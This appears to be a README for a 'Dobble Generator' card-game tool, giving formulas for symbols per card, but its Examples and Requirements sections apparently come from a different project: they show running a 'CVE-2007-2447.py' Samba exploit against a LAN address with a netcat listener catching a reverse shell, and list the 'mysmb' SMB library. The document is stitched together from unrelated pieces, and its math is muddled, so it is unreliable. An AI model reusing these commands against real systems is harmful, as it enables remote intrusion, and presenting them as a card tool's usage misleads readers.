## Dobble Generator
This tool is a dobble generator. Many mathematical properties are used.
To use it, simply enter the number of total images, put your images in the "images" folder and launch the main.py

## Table of contents
* [mathematical](#maths)
* [Exemples](#Examples)
* [Requirements](#requirements)

## mathematical
The mathematical property of the generator is :

```
(n * n+1) / 2 = number of total symbols on all the cards
(number of symbols per card * number of cards) / 2 = number of total symbols on all the cards
```

In this formula (which is not that of the official dobble) the number of cards is always greater than the number of symbols per card of "+1"
For example if the total number of symbols is 15 then:

```
15 * 2 = 30 and 5 * 6 = 30
5 is the number of symbols per card and 6 is the number of cards
```

or if the number of cards is 4, the number of symbols per card is "number of cards" - 1 therefore 3, then:

```
(3 * 4) / 2 = 6 ; there are therefore 6 symbols in total on all the cards
```



## Examples

```
py CVE-2007-2447.py 192.168.1.38 1337 192.168.1.14
```
and on my netcat :

```
netcat -lnvp 1337
```
Result :

netcat :

![alt text](https://image.noelshack.com/fichiers/2020/17/3/1587561245-capture.png)

and on the script:

![alt text](https://image.noelshack.com/fichiers/2020/17/3/1587561439-capture.png)

## Requirements
- mysmb
- platform
- sys
- os


